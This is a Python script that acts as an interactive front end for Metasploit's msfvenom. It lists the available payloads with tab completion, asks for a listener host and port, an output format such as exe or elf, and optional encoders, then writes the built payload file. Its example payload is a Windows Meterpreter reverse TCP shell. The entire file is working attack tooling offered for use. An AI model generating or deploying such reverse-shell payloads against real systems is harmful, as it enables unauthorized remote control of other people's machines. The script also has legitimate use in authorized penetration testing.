#!/usr/bin/env python3
import subprocess
import os
import re
import readline  # for CLI autocomplete
from datetime import datetime


def get_payload_list():
    """
    Retrieve and parse available payloads from msfvenom.
    Returns a list of payload strings.
    """
    try:
        output = subprocess.check_output(["msfvenom", "-l", "payloads"], text=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error listing payloads: {e}")
        return []
    payloads = []
    for line in output.splitlines():
        line = line.strip()
        if not line or re.match(r'^[=-]+$', line):
            continue
        parts = re.split(r"\s{2,}", line)
        if parts:
            payloads.append(parts[0])
    return payloads


def setup_autocomplete(options):
    """
    Configure readline autocomplete for the given list of options,
    preserving '/' in words so full payload paths complete.
    """
    def completer(text, state):
        matches = [o for o in options if o.startswith(text)]
        return matches[state] if state < len(matches) else None

    readline.set_completer(completer)
    # Remove '/' from delimiter set so payload strings complete as a whole
    delims = readline.get_completer_delims().replace('/', '')
    readline.set_completer_delims(delims)
    readline.parse_and_bind('tab: complete')


def build_payload(payload, lhost, lport, fmt, encoders=None, outdir=None):
    """
    Build a payload with msfvenom.
    """
    if not outdir:
        outdir = os.getcwd()
    os.makedirs(outdir, exist_ok=True)

    safe_name = payload.replace('/', '_')
    filename = f"{safe_name}_{lhost}_{lport}.{fmt}"
    path = os.path.join(outdir, filename)

    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", path]
    if encoders:
        for encoder in encoders:
            cmd += ["-e", encoder]

    print(f"[*] Running: {' '.join(cmd)}")
    subprocess.run(cmd, check=True)
    return path


def prompt_list(prompt):
    resp = input(prompt).strip()
    return [item.strip() for item in resp.split(',') if item.strip()]


def main():
    print("=== Msfvenom Interactive Payload Builder ===")

    # Fetch payload list and enable autocomplete
    payloads = get_payload_list()
    if payloads:
        count = len(payloads)
        print(f"Fetched {count} payloads. Use TAB to autocomplete full payload strings.")
        setup_autocomplete(payloads)
        payload = input("Enter payload (e.g. windows/meterpreter/reverse_tcp): ").strip()
        # Disable completer after selection
        readline.set_completer(None)
    else:
        payload = input("Enter payload: ").strip()

    lhost = input("Enter LHOST: ").strip()
    lport = input("Enter LPORT: ").strip()
    fmt = input("Enter output format (exe, elf, raw, python) [exe]: ").strip() or "exe"
    outdir = input("Enter output directory (leave blank for current dir): ").strip() or None
    encoders = prompt_list("Enter encoders (comma-separated) or leave blank: ")

    try:
        result = build_payload(payload, lhost, lport, fmt, encoders or None, outdir)
        print(f"[+] Payload saved to: {result}")
    except subprocess.CalledProcessError as err:
        print(f"[!] Error generating payload: {err}")

if __name__ == "__main__":
    main()
